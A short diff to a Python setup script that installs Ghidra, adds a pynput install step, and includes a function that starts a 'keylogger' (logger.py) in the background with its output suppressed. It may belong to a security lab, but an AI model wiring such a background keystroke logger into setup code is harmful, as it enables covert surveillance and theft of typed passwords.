@@ -34,7 +34,12 @@ def install_ghidra():
     print('#'*50)
     print('Ghidra installed')
     print('To open, use the command ./ghidraRun through the ghidra/ directory')
-
+    
+def install_pynput():
+    print("Now installing pynput library.")
+    os.system('sudo apt install -y python3-pip')
+    os.system('pip3 install pynput')
+    
 def start_logger():
     print("Now starting keylogger in the background")
     subprocess.Popen(["python3", "logger.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
